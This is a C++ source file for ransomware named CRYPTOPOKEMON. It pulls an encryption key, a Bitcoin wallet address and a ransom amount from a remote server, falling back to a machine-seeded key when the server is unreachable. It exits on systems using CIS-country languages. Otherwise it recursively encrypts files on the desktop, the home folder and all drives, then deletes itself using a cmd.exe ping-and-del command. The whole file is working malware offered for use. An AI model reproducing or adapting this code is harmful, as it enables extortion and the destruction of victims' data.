/*
 * MainLocker.cpp
 * The main crypto-locker file.
 * 
 * COPYRIGHT (C) 2019 PokemonGO TEAM
 * pokemongo.icu
 */

/* Default type defines */
#include "Lib/prog_defines.h"

/* Include FileManager */
#include "Lib/FileMan.h"

/* Simple HTTP 1.0 Requests */
#include "Lib/HttpRequest.h"

/* Generate Manchine ID */
#include "Lib/ManchineID.h"

/* OTHER INCLUDES */
#include <strsafe.h>
#include <shlobj.h>
#include <Windows.h>
#include <clocale>
#include "Lib/TextUtils.h"

/* CRYPTOR FUCNTION */
#include "Cryptor/Cryptor.h"

/** Self delete function */
void del_me()
{
	TCHAR sz_module_name[MAX_PATH];
	TCHAR sz_cmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, sz_module_name, MAX_PATH);

	StringCbPrintf(sz_cmd, 2 * MAX_PATH, L"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"", sz_module_name);

	CreateProcess(NULL, sz_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	ExitProcess(0);
}


String __PCID;

String __EncryptKey;

String __BTCWallet;

String __BTCSUMM;

queue<String> queueFileNames;

/** Default BTC wallet and amount */
void SetDefinedBTCWallet()
{
	__BTCSUMM = L"0.13873996";
	__BTCWallet = L"1Ez14MFBQ43KjYJE8oVnNFhQMSBiKa6YbS";
}

/** Generate random key if crypto-server offline */
void gen_random_key() {
	__EncryptKey = L"";
	srand(_wtoi(__PCID.c_str()));
	String randomString = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	for (int i = 0; i < 30; ++i) {
		__EncryptKey += randomString.c_str()[rand() % (randomString.size())];
	}
	SetDefinedBTCWallet();
}

/** Get Encrypt key from URL */
void get_encrypt_key(std::string URL)
{
	WSADATA wsa_data;

	/** GET Encrypt key, btc wallet, btc amount */
	const auto sz_url = _strdup(URL.c_str());

	WSAStartup(0x101, &wsa_data);

	/////////////////////////////////////////////////////////////////
	//mem_buffer defailt data to parse
	//RBWQG4XXCUZINZ7X2W70LFZOB0POGT 1FscAxs9Goj1w582wNmTeCbYWPeRJNkW4A 0.0793764
	const auto mem_buffer = HttpRequest::read_url(sz_url);

	if (mem_buffer == nullptr)
	{
		gen_random_key();
	}
	else
	{
		if (strlen(mem_buffer) == 75)
		{
			const auto all_encrypted_data = TextUtils::get_wc(mem_buffer);

			for (auto i = 0; i < 30; i++)
				__EncryptKey += all_encrypted_data[i];
			for (auto i = 31; i < 65; i++)
				__BTCWallet += all_encrypted_data[i];
			for (auto i = 66; i < 75; i++)
				__BTCSUMM += all_encrypted_data[i];
		}
		else
		{
			gen_random_key();
		}
	}

	WSACleanup();
}

/** Worker for crypt files */
void WorkerRunning()
{
	while (true) // Worker running
	{
		String FilePath = queueFileNames.pop();
		if(FilePath == L"EXIT")
		{
			return;
		}
		Cryptor::crypt_func(FilePath, FilePath + CRYPT_lEXT, MODE_ENCRYPT);
	}
}

/** Start CRYPTOPOKEMON function */
#ifdef _CONSOLE
int main()
#else // Hide console window on Release
int WINAPI WinMain(
	 HINSTANCE hInstance,
	 HINSTANCE hPrevInstance,
	 LPSTR lpCmdLine,
	 int nShowCmd)
#endif
{
	setlocale(LC_ALL, "");

	if constexpr (BLOCK_LEN % 8 != 0) // Check valid block len size
		return -1; 

	/*
	 * *************************************************
	 * ****************** DO NOT EDIT ******************
	 * *************************************************
	 */
	const auto lang = GetUserDefaultLangID(); // Get current system interface language
	if (
		lang == 2092 || // Azeri - Cyrillic
		lang == 1068 || // Azeri - Latin
		lang == 1067 || // Armenian
		lang == 1059 || // Belarusian
		lang == 1079 || // Georgian
		lang == 1087 || // Kazakh
		lang == 1088 || // Kyrgyz - Cyrillic
		lang == 2073 || // Russian - Moldova
		lang == 1049 || // Russian
		lang == 1064 || // Tajik
		lang == 1090 || // Turkmen
		lang == 2115 || // Uzbek - Cyrillic
		lang == 1091 || // Uzbek - Latin
		lang == 1058    // Ukrainian
		)
	{
#ifndef _DEBUG // Disable on debug
		ExitProcess(0); // CRYPTOPOKEMON does not work in CIS countries
#endif
	}
	/*
	 * CODE BELOW YOU CAN EDIT
	 */

	/** Get hardware threads */
	const auto concurent_threads_supported = std::thread::hardware_concurrency();
	/** Workers collection */
	std::vector<std::thread> MyWorkers;

	//Add workers to thread
	for (unsigned i = 0; i < concurent_threads_supported; i++)
	{
		MyWorkers.emplace_back(WorkerRunning);
	}

	//////////////////////////////////////
	// Generate a unique computer ID
	SHORT mac1, mac2;
	ManchineID::get_mac_hash(mac1, mac2);

	__PCID =
		std::to_wstring(ManchineID::get_cpu_hash()) +
		std::to_wstring(mac1) +
		std::to_wstring(mac2) +
		std::to_wstring(ManchineID::get_volume_hash()) +
		ManchineID::get_machine_name();

	const std::hash<String> hasher;

	__PCID = std::to_wstring(hasher(__PCID));
	// END PcId generator
	//////////////////////////////////////

	get_encrypt_key(TextUtils::w_convert_to_string(L"http://cryptopokemon.top/key.php?id=" + __PCID + L"&p=0"));

	FileManager flm;
	// DESKTOP FILES DIR
	flm.recursive_search(FileManager::get_defined_path(CSIDL_DESKTOP));
	flm.BlackPatches.push_back(FileManager::get_defined_path(CSIDL_DESKTOP));
	
	// Temp Directory
	flm.BlackPatches.push_back(FileManager::get_temp_folder());

	// Home Directory
	flm.recursive_search(FileManager::get_defined_path(CSIDL_PROFILE));
	flm.BlackPatches.push_back(FileManager::get_defined_path(CSIDL_PROFILE));
	
	// WINDOWS DIR
	flm.BlackPatches.push_back(FileManager::get_defined_path(CSIDL_WINDOWS));

	// PROGRAM FILES DIR
	flm.BlackPatches.push_back(FileManager::get_defined_path(CSIDL_PROGRAM_FILES));

	// PROGRAM FILESx86 DIR
	flm.BlackPatches.push_back(FileManager::get_defined_path(CSIDL_PROGRAM_FILESX86));
	
	// Drive letter for'each
	for (const auto& drive_letter : FileManager::show_drive_letters())
	{
		flm.recursive_search(drive_letter);
		flm.BlackPatches.push_back(drive_letter);
	}

	// Wait to stop all workers
	for (auto& thread : MyWorkers) queueFileNames.push(L"EXIT");
	for (auto& thread : MyWorkers) thread.join();
	del_me();
	return 0;
}
